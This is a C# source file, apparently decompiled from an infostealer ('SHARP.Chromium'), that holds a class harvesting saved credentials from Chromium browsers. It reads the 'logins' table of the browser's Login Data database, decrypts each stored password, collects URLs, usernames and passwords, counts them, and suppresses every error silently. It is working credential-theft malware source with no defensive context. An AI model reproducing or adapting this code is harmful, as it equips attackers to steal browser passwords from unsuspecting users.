﻿using System;
using System.Collections.Generic;

namespace SHARP.Chromium
{
	// Token: 0x02000085 RID: 133
	internal sealed class Passwords
	{
		// Token: 0x060002C2 RID: 706 RVA: 0x00010F4C File Offset: 0x0000F14C
		public static List<Password> Get(string sLoginData)
		{
			List<Password> list = new List<Password>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sLoginData, "logins");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Password item = default(Password);
					item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 0));
					item.sUsername = Crypto.GetUTF8(sqlite.GetValue(i, 3));
					string value = sqlite.GetValue(i, 5);
					string[] sChromiumPswPaths = Paths.sChromiumPswPaths;
					for (int j = 0; j < sChromiumPswPaths.Length; j++)
					{
						string sBrowser = Crypto.BrowserPathToAppName(sChromiumPswPaths[j]);
						item.sBrowser = sBrowser;
					}
					if (value != null)
					{
						item.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value));
						list.Add(item);
						Counting.Passwords++;
					}
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
